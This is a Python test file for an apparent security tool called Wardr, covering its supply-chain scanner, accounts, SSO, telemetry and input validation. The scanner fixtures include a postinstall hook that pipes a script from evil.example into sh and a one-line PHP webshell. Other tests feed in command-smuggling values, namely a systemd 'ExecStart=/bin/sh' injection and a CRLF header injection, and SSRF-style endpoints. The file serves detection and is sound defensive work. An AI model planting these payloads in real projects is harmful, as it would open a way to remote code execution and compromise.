"""Tests for Wardr Accounts/SSO/Telemetry, What's New changelog, Privacy/Terms, and Supply-Chain Scanner."""

import json
import os
import stat
import tempfile
import unittest
from pathlib import Path

from wardr import account, changelog, legal, supply_chain
from wardr.state import WardrState


class SupplyChainScannerTests(unittest.TestCase):
    def test_detects_compromised_npm_react2shell_php_webshell_log4shell_and_postinstall(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            # 1. Compromised npm + React2Shell + malicious postinstall
            (root / "package.json").write_text(json.dumps({
                "name": "demo-web",
                "version": "1.0.0",
                "dependencies": {
                    "ua-parser-js": "0.7.29",
                    "next": "15.1.3",
                    "react-server-dom-webpack": "19.1.0",
                    "chalk": "5.6.1",
                },
                "scripts": {
                    "postinstall": "curl -s https://evil.example/payload.sh | sh",
                },
            }), encoding="utf-8")

            # 2. PHP webshell
            (root / "upload.php").write_text("<?php eval($_POST['cmd']); ?>\n", encoding="utf-8")

            # 3. Log4Shell in pom.xml
            (root / "pom.xml").write_text(
                "<dependency><artifactId>log4j-core</artifactId><version>2.14.1</version></dependency>",
                encoding="utf-8",
            )

            # 4. Hijacked Polyfill.io CDN
            (root / "index.html").write_text(
                '<script src="https://cdn.polyfill.io/v3/polyfill.min.js"></script>',
                encoding="utf-8",
            )

            result = supply_chain.scan_supply_chain(roots=[root])
            self.assertEqual(result["status"], "exposed")
            kinds = {f["kind"] for f in result["findings"]}
            titles = "\n".join(f["title"] for f in result["findings"])
            self.assertIn("compromised_npm", kinds)
            self.assertIn("framework_rce", kinds)
            self.assertIn("malicious_script", kinds)
            self.assertIn("php_webshell", kinds)
            self.assertIn("compromised_cdn", kinds)
            self.assertIn("ua-parser-js@0.7.29", titles)
            self.assertIn("chalk@5.6.1", titles)
            self.assertIn("React2Shell", titles)
            self.assertIn("Log4Shell", titles)
            self.assertIn("polyfill.io", titles)

    def test_clean_repo_returns_clean_status(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(json.dumps({
                "name": "clean-app",
                "version": "1.0.0",
                "dependencies": {"next": "15.5.7", "chalk": "5.6.2"},
                "scripts": {"build": "next build"},
            }), encoding="utf-8")
            result = supply_chain.scan_supply_chain(roots=[root])
            # Ignore any host PHP finding if host has old php; verify 0 npm/repo findings from root
            repo_findings = [f for f in result["findings"] if str(root.name) in f["location"] or f["kind"] != "framework_rce"]
            self.assertEqual(repo_findings, [])


class AccountSsoAndTelemetryTests(unittest.TestCase):
    def test_register_login_logout_preferences_and_pkce_sso(self):
        with tempfile.TemporaryDirectory() as tmp:
            state_dir = Path(tmp)
            mgr = account.AccountManager(state_dir, offline=False)
            self.assertTrue(mgr.status()["auth_required"])

            # Reject missing legal consent
            with self.assertRaises(ValueError):
                mgr.register_email(email="alice@example.com", password="SuperStrongPassword123!", accepted_legal=False)

            # Reject weak short password
            with self.assertRaises(ValueError):
                mgr.register_email(email="alice@example.com", password="short", accepted_legal=True)

            reg = mgr.register_email(
                email="Alice@Example.com",
                password="SuperStrongPassword123!",
                name="Alice",
                accepted_legal=True,
                share_system_diagnostics=True,
                share_threat_intelligence=False,
            )
            self.assertTrue(reg["signed_in"])
            self.assertFalse(reg["auth_required"])
            self.assertEqual(reg["account"]["email"], "alice@example.com")
            self.assertTrue(reg["account"]["preferences"]["share_system_diagnostics"])
            self.assertFalse(reg["account"]["preferences"]["share_threat_intelligence"])

            # Verify 0600 permissions on stored credentials/session
            if os.name == "posix":
                self.assertEqual(stat.S_IMODE(mgr.session_path.stat().st_mode), 0o600)
                self.assertEqual(stat.S_IMODE(mgr.users_path.stat().st_mode), 0o600)

            # Sign out and sign back in with scrypt verification
            mgr.sign_out()
            self.assertTrue(mgr.status()["auth_required"])
            with self.assertRaises(ValueError):
                mgr.login_email(email="alice@example.com", password="WrongPassword123!")
            logged_in = mgr.login_email(email="alice@example.com", password="SuperStrongPassword123!")
            self.assertTrue(logged_in["signed_in"])

            # Configure Google SSO Client ID and verify PKCE S256 authorize URL
            mgr.update_sso_config({"google_client_id": "test-google-client.apps.googleusercontent.com"})
            sso = mgr.start_sso("google", callback_url="http://127.0.0.1:9999/auth/callback", accepted_legal=True)
            self.assertTrue(sso["ok"])
            self.assertIn("accounts.google.com/o/oauth2/v2/auth", sso["authorize_url"])
            self.assertIn("code_challenge_method=S256", sso["authorize_url"])
            self.assertIn("state=", sso["authorize_url"])

    def test_offline_mode_bypasses_auth_gate_and_blocks_telemetry_sync(self):
        with tempfile.TemporaryDirectory() as tmp:
            state = WardrState(Path(tmp), offline=True)
            st = state.status()
            self.assertFalse(st["account"]["auth_required"])
            self.assertTrue(st["account"]["offline"])
            with self.assertRaises(account.AccountError):
                state.sync_telemetry()

    def test_whats_new_and_legal_payloads(self):
        with tempfile.TemporaryDirectory() as tmp:
            state = WardrState(Path(tmp))
            st = state.status()
            self.assertTrue(st["whats_new"]["should_show"])
            self.assertTrue(st["whats_new"]["latest"]["highlights"])

            seen = state.mark_whats_new_seen()
            self.assertFalse(seen["should_show"])

            # Persists across restart
            reloaded = WardrState(Path(tmp))
            self.assertFalse(reloaded.status()["whats_new"]["should_show"])

            leg = legal.legal_payload()
            self.assertGreaterEqual(len(leg["privacy"]), 4)
            self.assertGreaterEqual(len(leg["terms"]), 4)


class SecurityAuditRegressionTests(unittest.TestCase):
    def test_redaction_strips_compressed_ipv6_and_groq_openrouter_keys(self):
        from wardr import reporting
        sample = (
            "Host 2001:db8::42 failed with key gsk_1234567890abcdef1234567890 and "
            "sk-or-v1-1234567890abcdef1234567890 at /users/alice/app"
        )
        cleaned, counts = reporting.redact_text(sample)
        self.assertNotIn("2001:db8::42", cleaned)
        self.assertNotIn("gsk_", cleaned)
        self.assertNotIn("sk-or-v1-", cleaned)
        self.assertNotIn("/users/alice", cleaned)
        self.assertGreaterEqual(counts.get("ipv6", 0), 1)
        self.assertGreaterEqual(counts.get("secret", 0), 2)

    def test_ai_tiers_rejects_shorthand_ip_and_control_chars(self):
        from wardr import ai_tiers
        with self.assertRaises(ValueError):
            ai_tiers._validate_cloud_endpoint("https://127.1/v1/chat")
        with self.assertRaises(ValueError):
            ai_tiers._validate_cloud_endpoint("https://2130706433/v1/chat")
        with self.assertRaises(ValueError):
            ai_tiers._validate_cloud_endpoint("https://metadata.google.internal/v1")
        with tempfile.TemporaryDirectory() as tmp:
            with self.assertRaises(ValueError):
                ai_tiers.save_config(Path(tmp), {"cloud_api_key": "abc\r\nX-Injected: 1"})

    def test_threat_network_zero_day_votes_require_distinct_reporters(self):
        from wardr.threat_network import ThreatNetworkStore
        with tempfile.TemporaryDirectory() as tmp:
            store = ThreatNetworkStore(Path(tmp), escalation_reporters=3, zero_day_threshold=2)
            payload = {
                "schema_version": 1,
                "report_kind": "finding",
                "fingerprint": "abcdef1234567890abcd",
                "suspected_zero_day": True,
                "environment": {"os": "macOS"},
                "signal": {"title": "Test signal"},
            }
            # Same IP submitting twice should count as only 1 distinct zero-day vote (not escalated!)
            r1 = store.ingest_report(payload, client_ip="203.0.113.10")
            r2 = store.ingest_report(payload, client_ip="203.0.113.10")
            self.assertEqual(r2["triage_status"], "open")
            # A second distinct IP reaches threshold=2 and escalates
            r3 = store.ingest_report(payload, client_ip="203.0.113.11")
            self.assertEqual(r3["triage_status"], "escalated")

    def test_service_templates_escape_and_reject_control_chars(self):
        from wardr import service
        with self.assertRaises(ValueError):
            service.render_template("systemd", state_dir="/tmp/bad\nExecStart=/bin/sh")
        xml_out = service.render_template("launchd", state_dir="/tmp/a&b<c>")
        self.assertIn("/tmp/a&amp;b&lt;c&gt;", xml_out)
        ps_out = service.render_template("windows", state_dir="C:\\Users\\O'Brien\\$var")
        self.assertIn("O''Brien", ps_out)
        self.assertIn("`$var", ps_out)

    def test_release_sign_manifest_uses_native_cryptography_ed25519(self):
        from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
        from cryptography.hazmat.primitives.serialization import Encoding, NoEncryption, PrivateFormat
        from wardr import release

        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            priv = Ed25519PrivateKey.generate()
            key_path = root / "key.pem"
            key_path.write_bytes(priv.private_bytes(Encoding.PEM, PrivateFormat.PKCS8, NoEncryption()))
            manifest = root / "manifest.json"
            manifest.write_bytes(b'{"schema_version":1}\n')
            sig = root / "manifest.json.sig"
            pub = root / "pub.pem"
            release.sign_manifest(manifest, key_path, sig, pub)
            self.assertEqual(sig.stat().st_size, 64)
            release.verify_manifest_signature(manifest.read_bytes(), sig.read_bytes(), pub.read_bytes())

    def test_single_use_bootstrap_nonce_exchange_rejects_replay(self):
        from wardr.server import DashboardServer
        with tempfile.TemporaryDirectory() as tmp:
            st = WardrState(Path(tmp), offline=True)
            with DashboardServer(0, st) as srv:
                nonce = srv.launch_url.split("#access=", 1)[1]
                self.assertNotEqual(nonce, srv.token)
                first = srv.exchange_bootstrap_nonce(nonce)
                self.assertIsNotNone(first)
                self.assertTrue(srv.is_valid_session_token(first))
                # Replay of the same launch nonce must fail!
                self.assertIsNone(srv.exchange_bootstrap_nonce(nonce))

    def test_central_telemetry_ingest_and_summary_end_to_end(self):
        import http.client
        import sqlite3
        import threading
        from wardr.threat_network import ThreatNetworkServer, ThreatNetworkStore

        with tempfile.TemporaryDirectory() as server_tmp, tempfile.TemporaryDirectory() as client_tmp:
            store = ThreatNetworkStore(Path(server_tmp))
            admin_token = "test-admin-telemetry-token-12345"
            server = ThreatNetworkServer(("127.0.0.1", 0), store, admin_token=admin_token)
            port = server.server_address[1]
            thread = threading.Thread(target=server.serve_forever, daemon=True)
            thread.start()
            try:
                st = WardrState(Path(client_tmp), offline=False)
                st.accounts.update_sso_config({"server_url": f"http://127.0.0.1:{port}"})
                st.accounts.register_email(
                    email="alice.private@example.com",
                    password="SuperStrongPassword123!",
                    name="Alice Private",
                    accepted_legal=True,
                    share_system_diagnostics=True,
                    share_threat_intelligence=True,
                )
                # Populate scan, exposure, pentest, and supply-chain data containing sensitive local strings
                st._scan_profile = "medium"
                st._scan_duration_ms = 1420
                st._scan = {
                    "host": st.host["name"],
                    "scanned_at": "2026-11-22T12:00:00+00:00",
                    "checks": [
                        {
                            "id": "macos-firewall",
                            "title": "Application firewall",
                            "category": "Network",
                            "status": "fail",
                            "severity": "high",
                            "evidence": "Disabled on /Users/secretuser/Desktop with IP 10.0.0.42",
                            "remediation": "Enable firewall",
                        },
                        {
                            "id": "macos-filevault",
                            "title": "FileVault",
                            "category": "Disk",
                            "status": "pass",
                            "severity": "high",
                            "evidence": "Enabled for secretuser@company.com",
                            "remediation": "None",
                        },
                    ],
                }
                st._exposure = {
                    "listeners": [
                        {"port": 6379, "protocol": "tcp", "address": "10.0.0.42", "scope": "wildcard", "process": "/Users/secretuser/redis-server"},
                    ],
                }
                st._pentest = {
                    "score_pct": 83,
                    "verdict": "warn",
                    "tests": [
                        {"id": "firewall-lan", "outcome": "exposed", "findings": [{"title": "Firewall off"}]},
                        {"id": "infostealer-sim", "outcome": "defended", "findings": []},
                    ],
                }
                st._supply_chain = {
                    "status": "exposed",
                    "summary": {"repos_detected": 4, "manifests_scanned": 9, "packages_checked": 180},
                    "findings": [
                        {
                            "kind": "compromised_npm",
                            "cve": "CVE-2025-55182",
                            "package": "chalk",
                            "version": "5.6.1",
                            "severity": "critical",
                            "location": "/Users/secretuser/Repos/secret-app/package.json",
                        },
                    ],
                }

                # Sync live over loopback HTTP to central collector
                receipt = st.sync_telemetry()
                self.assertTrue(receipt["ok"])
                self.assertTrue(receipt["delivered"])

                # 1. Verify /v1/health counts the telemetry snapshot
                conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
                conn.request("GET", "/v1/health")
                resp = conn.getresponse()
                health = json.loads(resp.read())
                self.assertEqual(resp.status, 200)
                self.assertEqual(health["telemetry_snapshots"], 1)

                # 2. Verify /api/v1/telemetry/summary rejects unauthenticated callers
                conn.request("GET", "/api/v1/telemetry/summary")
                unauth = conn.getresponse()
                unauth.read()
                self.assertEqual(unauth.status, 401)

                # 3. Verify /api/v1/telemetry/summary returns rich central aggregations for admins
                conn.request("GET", "/api/v1/telemetry/summary", headers={"Authorization": f"Bearer {admin_token}"})
                summary_resp = conn.getresponse()
                summary = json.loads(summary_resp.read())
                self.assertEqual(summary_resp.status, 200)
                self.assertEqual(summary["total_snapshots"], 1)
                self.assertEqual(summary["unique_accounts"], 1)
                self.assertIn(st.host["os"], summary["by_os"])
                self.assertEqual(summary["top_failing_checks"][0]["id"], "macos-firewall")
                self.assertEqual(summary["top_pentest_exposures"][0]["id"], "firewall-lan")
                self.assertEqual(summary["top_exposed_risky_ports"][0]["port"], 6379)
                self.assertEqual(summary["top_supply_chain_matches"][0]["package"], "chalk")

                # 4. Verify server rejects telemetry when both opt-in flags are False
                bad_payload = json.dumps({
                    "schema_version": 1,
                    "wardr_version": "0.4.0",
                    "account_hash": "abcdef1234567890",
                    "opt_in": {"system_diagnostics": False, "threat_intelligence": False},
                }).encode("utf-8")
                conn.request(
                    "POST",
                    "/api/v1/telemetry/ingest",
                    body=bad_payload,
                    headers={"Content-Type": "application/json", "Content-Length": str(len(bad_payload))},
                )
                bad_resp = conn.getresponse()
                bad_resp.read()
                self.assertEqual(bad_resp.status, 400)
                conn.close()

                # 5. Inspect central SQLite payload directly to guarantee ZERO PII leaked
                from contextlib import closing
                with closing(sqlite3.connect(store.db_path)) as db:
                    stored_payload = db.execute("SELECT payload FROM telemetry_snapshots").fetchone()[0]
                for forbidden in ("secretuser", "10.0.0.42", "alice.private@example.com", "Alice Private", "secret-app"):
                    self.assertNotIn(forbidden, stored_payload)
            finally:
                server.shutdown()
                server.server_close()

    def test_auto_sync_telemetry_respects_opt_in_and_throttles(self):
        with tempfile.TemporaryDirectory() as tmp:
            st = WardrState(Path(tmp), offline=False)
            # Not signed in -> False
            self.assertFalse(st._maybe_auto_sync_telemetry())
            # Signed in without opt-in -> False
            st.accounts.register_email(
                email="bob@example.com",
                password="SuperStrongPassword123!",
                accepted_legal=True,
                share_system_diagnostics=False,
                share_threat_intelligence=False,
            )
            self.assertFalse(st._maybe_auto_sync_telemetry())
            # Opt in -> triggers once, then throttles subsequent call within window
            st.accounts.update_preferences({"share_system_diagnostics": True})
            st.accounts.update_sso_config({"server_url": "http://127.0.0.1:1"})
            self.assertTrue(st._maybe_auto_sync_telemetry(min_interval_seconds=60.0))
            self.assertFalse(st._maybe_auto_sync_telemetry(min_interval_seconds=60.0))


if __name__ == "__main__":
    unittest.main()
